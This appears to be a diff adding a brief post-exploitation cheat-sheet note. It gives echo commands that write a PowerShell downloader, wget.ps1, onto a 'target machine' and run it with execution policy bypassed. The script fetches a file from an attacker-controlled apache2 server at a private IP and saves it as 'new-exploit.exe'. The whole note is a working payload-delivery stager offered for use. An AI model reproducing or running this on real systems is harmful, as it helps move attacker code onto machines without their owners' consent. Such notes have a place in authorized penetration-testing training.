@@ -1,0 +1,14 @@
+wget powershell script copy the following int the target machine. edit depending on files you want to copy from your apache2 server
+dont forget to start apache2 server
+file created is call wget.ps1
+
+execute
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File wget.ps1
+####################################
+######################################
+ 
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
+echo $url = "http://192.168.14.220/evidence.txt" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
